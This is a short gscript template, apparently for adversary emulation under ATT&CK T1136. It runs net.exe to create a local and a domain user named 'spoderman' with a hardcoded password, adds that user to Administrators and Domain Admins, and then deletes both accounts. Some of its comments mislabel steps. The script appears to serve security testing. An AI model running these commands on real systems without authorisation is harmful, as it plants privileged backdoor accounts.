// Example gscript template
// Title: Net User Creation
// Author: ahhh
// Purpose: add a local user, domain user, add them to local administrators and domain administrators groups
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1136

//priority:100
//timeout:150

var fn;

function Deploy() {  
  console.log("starting execution of Net User Creation");
  // Add a local user
  G.exec.ExecuteCommandAsync("net.exe", ["user", "spoderman", "TheAmazing", "/add", "/fullname:Spoder Man"]);
  console.log("Added a local user spoderman");

  // Add a domain user
  G.exec.ExecuteCommandAsync("net.exe", ["user", "spoderman", "TheAmazing", "/add", "/fullname:Spoder Man", "/domain"]);
  console.log("Added a domain user spoderman");

  // Add the user to Adminsistrators group
  G.exec.ExecuteCommandAsync("net.exe", ["group", "Administrators", "spoderman", "/add"]);
  console.log("Added spoderman to the Administrators group");

  // Add the user to the Domain Adminsistrators group
  G.exec.ExecuteCommandAsync("net.exe", ["group", "Domain Admins", "spoderman", "/add", "/domain"]);
  console.log("Added spoderman to the Domain Administrators group");

  // Add the user to the Domain Adminsistrators group
  G.exec.ExecuteCommandAsync("net.exe", ["localgroup", "Administrators", "spoderman", "/add"]);
  console.log("Added spoderman to the local Administrators group");

  // Removed the local user spoderman
  G.exec.ExecuteCommandAsync("net.exe", ["user", "spoderman", "/delete"]);
  console.log("Removed the local user spoderman");

  // Removed the domain user spoderman
  G.exec.ExecuteCommandAsync("net.exe", ["user", "spoderman", "/delete", "/domain"]);
  console.log("Removed the local user spoderman");

  console.log("done Net User Creation");

  return true;
}
